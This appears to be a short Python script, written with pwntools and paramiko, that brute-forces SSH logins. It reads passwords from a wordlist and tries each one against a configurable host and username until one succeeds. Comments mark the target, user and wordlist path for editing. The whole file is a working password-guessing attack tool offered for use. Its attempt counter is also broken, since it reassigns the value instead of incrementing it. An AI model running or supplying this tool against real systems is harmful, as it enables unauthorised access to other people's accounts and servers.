from pwn import *
import paramiko

host = '127.0.0.1'  ### Edit this

username = 'Cryptex' ### Edit this 
attempt = 0

### Put your customize password list path
with open("/home/kali/py/password.txt", "r") as password_list:
	for password in password_list:
	  password= password.strip("\n")
	  try:
	    print(" [{}] Attempting password for {}:{}".format(attempt,username,password))
	    response = ssh(host=host,user=username,password=password,timeout=3)
	    
	    if response.connected():
	      print("[+] Valid password Found {}".format(password))
	      response.close()
	      break
	  except paramiko.ssh_exception.AuthenticationException:
	      print("Wrong Password [X]")
	  attempt = +1
	  
	  
	
	  
